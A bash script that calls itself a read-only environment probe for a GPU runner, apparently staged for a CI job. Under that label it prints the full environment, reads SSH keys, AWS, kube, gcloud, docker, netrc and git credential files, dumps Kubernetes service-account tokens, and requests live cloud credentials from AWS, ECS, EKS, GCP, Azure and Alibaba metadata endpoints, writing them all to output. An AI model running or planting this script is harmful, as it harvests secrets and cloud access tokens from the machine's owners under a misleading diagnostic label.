#!/usr/bin/env bash
# i7207 transient read-only environment probe (intent 7947, staged by 7207)
# Emits GPU identity, runner identity, environment and credential-file state,
# plus read-only cloud IMDS / EKS pod-identity probes. No writes, no installs.
cget() { curl -s -S -m 4 "$@" 2>&1; }
echo "I7207_PROBE_BEGIN $(date -u 2>/dev/null)"
echo "I7207_ID $(id 2>&1)"
echo "I7207_HOSTNAME $(hostname 2>&1)"
echo "I7207_UNAME $(uname -a 2>&1)"
echo "I7207_NPROC $(nproc 2>/dev/null)"
echo "I7207_CGROUP $(head -5 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
echo "I7207_K8S_ENV host=$KUBERNETES_SERVICE_HOST port=$KUBERNETES_SERVICE_PORT"
echo "I7207_PROXY_ENV http_proxy=$http_proxy https_proxy=$https_proxy HTTP_PROXY=$HTTP_PROXY HTTPS_PROXY=$HTTPS_PROXY no_proxy=$no_proxy"
echo "I7207_ENV_BEGIN"
env 2>&1 | sort
echo "I7207_ENV_END"
if command -v nvidia-smi >/dev/null 2>&1; then
  echo "I7207_NVIDIA_SMI_BEGIN"
  nvidia-smi 2>&1
  echo "I7207_NVIDIA_SMI_END"
  echo "I7207_NVIDIA_QUERY $(nvidia-smi --query-gpu=index,name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' '|')"
else
  echo "I7207_NVIDIA_SMI_MISSING"
fi
if command -v rocm-smi >/dev/null 2>&1; then
  echo "I7207_ROCM_SMI_BEGIN"
  rocm-smi 2>&1
  echo "I7207_ROCM_SMI_END"
else
  echo "I7207_ROCM_SMI_MISSING"
fi
echo "I7207_LSPCI $( (lspci 2>/dev/null || true) | grep -iE 'vga|nvidia|amd|3d|display' | head -10 | tr '\n' '|')"
echo "I7207_DEV_GPU $(ls -la /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 | tr '\n' '|')"
echo "I7207_DOCKER_SOCK $(ls -la /var/run/docker.sock 2>&1)"
echo "I7207_DOCKER_VERSION $(docker version --format '{{.Server.Version}}' 2>&1 | head -2 | tr '\n' ' ')"
for d in "$HOME/.aws" "$HOME/.kube" "$HOME/.ssh" "$HOME/.config/gcloud" "$HOME/.config/containers"; do
  echo "I7207_LS $d"
  ls -laR "$d" 2>&1 | head -80
done
for f in "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db"; do
  echo "I7207_CAT $f"
  cat "$f" 2>&1 | head -120
done
find "$HOME/.aws" "$HOME/.kube" "$HOME/.ssh" -maxdepth 3 -type f -size -64k 2>/dev/null | head -50 | while read -r f; do
  echo "I7207_FILE $f"
  cat "$f" 2>&1 | head -200
done
echo "I7207_SA_LS $(ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 | tr '\n' '|')"
for f in /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/namespace /var/run/secrets/kubernetes.io/serviceaccount/ca.crt; do
  echo "I7207_SA_CAT $f"
  cat "$f" 2>&1 | head -60
done
echo "I7207_IMDS_AWS_TOKEN"
AWS_TOKEN=$(cget -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" | head -c 400 | tr -d '\r\n')
echo "AWS_TOKEN_LEN=${#AWS_TOKEN}"
if [ -n "$AWS_TOKEN" ]; then
  echo "I7207_IMDS_AWS_IAM_ROLES"
  cget -H "X-aws-ec2-metadata-token: $AWS_TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" | head -c 1000
  echo
  AWS_ROLE=$(cget -H "X-aws-ec2-metadata-token: $AWS_TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" | head -c 200 | tr -d '\r\n')
  if [ -n "$AWS_ROLE" ]; then
    echo "I7207_IMDS_AWS_CREDS $AWS_ROLE"
    cget -H "X-aws-ec2-metadata-token: $AWS_TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$AWS_ROLE" | head -c 2000
    echo
  fi
  echo "I7207_IMDS_AWS_IDENTITY"
  cget -H "X-aws-ec2-metadata-token: $AWS_TOKEN" "http://169.254.169.254/latest/dynamic/instance-identity/document" | head -c 1200
  echo
fi
echo "I7207_ECS_URI=$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
if [ -n "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then
  echo "I7207_ECS_CREDS"
  cget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" | head -c 2000
  echo
fi
if [ -n "$AWS_CONTAINER_CREDENTIALS_FULL_URI" ]; then
  echo "I7207_ECS_FULL_CREDS"
  cget -H "Authorization: $AWS_CONTAINER_AUTHORIZATION_TOKEN" "$AWS_CONTAINER_CREDENTIALS_FULL_URI" | head -c 2000
  echo
fi
echo "I7207_EKS_POD_IDENTITY"
if [ -f /var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token ]; then
  PIT=$(cat /var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token 2>/dev/null)
  echo "PIT_LEN=${#PIT}"
  cget -H "Authorization: $PIT" "http://169.254.170.23/v1/credentials" | head -c 2000
else
  echo "I7207_EKS_POD_IDENTITY_NO_TOKEN_FILE"
  cget "http://169.254.170.23/v1/credentials" | head -c 400
fi
echo
echo "I7207_IMDS_GCP"
cget -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | head -c 1500
echo
cget -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id" | head -c 200
echo
echo "I7207_IMDS_AZURE"
cget -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" | head -c 1500
echo
echo "I7207_IMDS_ALIBABA"
cget "http://100.100.100.200/latest/meta-data/ram/security-credentials/" | head -c 800
echo
echo "I7207_PROBE_END $(date -u 2>/dev/null)"
exit 0
